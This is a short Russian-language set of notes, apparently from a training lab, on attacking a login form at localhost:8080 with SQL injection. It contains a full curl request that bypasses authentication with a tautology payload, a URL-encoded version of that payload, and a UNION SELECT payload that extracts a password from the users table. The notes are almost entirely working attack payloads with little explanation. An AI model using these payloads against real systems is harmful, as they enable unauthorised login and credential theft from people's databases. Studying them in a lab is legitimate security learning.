# Обход клиентской защиты с помощью curl
```
>curl "http://localhost:8080/signin" -X POST -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: en,en-US;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://localhost:8080" -H "DNT: 1" -H "Connection: keep-alive" -H "Referer: http://localhost:8080/login.html" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" -H "Sec-GPC: 1" --data-raw "name=1' OR 1=1--&pass=1&banned=false"

<success User1
```
# Обход защиты с помощью кодирования кавычки в альтернативный формат
Пароль:
```
1%27 OR 1=1--
```
# Кража пароля из БД
Имя: User1
Пароль:
```
1%27) or 1=1 union select (select min(pass) from users) order by 1 asc limit 1--
```